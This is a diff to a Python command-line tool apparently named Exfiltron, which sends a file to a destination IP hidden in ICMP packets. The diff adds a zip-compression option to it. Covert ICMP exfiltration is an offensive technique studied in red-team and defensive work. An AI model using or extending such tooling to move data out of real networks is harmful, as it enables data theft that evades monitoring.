@@ -119,6 +119,13 @@ def setArgParserOptions():
                         "the hash will ignore the setting in the -a flag",
                         default=False)
 
+    # Add option to zip the file before sending it over the network
+    parser.add_argument('-z', '--zip', action='store_true', help="Exfiltron " +
+                        "will zip your file for you and send the zipped file " +
+                        "over the network. WARNING: IF A PACKET IS LOST OR " +
+                        "DATA IS CORRUPTED, EXFILTRON WILL BE UNABLE TO PIECE" +
+                        " YOUR DATA BACK TOGETHER", default="False")
+
     return parser.parse_args()
 
 
@@ -219,8 +226,8 @@ def main():
             sys.exit()
 
         send(icmp.icmp(args.dest_ip, args.file_name, args.data_per_packet,
-             args.encrypt, args.integrity_check), args.time, args.dest_ip,
-             args.quiet)
+             args.encrypt, args.integrity_check, args.zip), args.time,
+             args.dest_ip, args.quiet)
 
 
 if (__name__ == '__main__'):
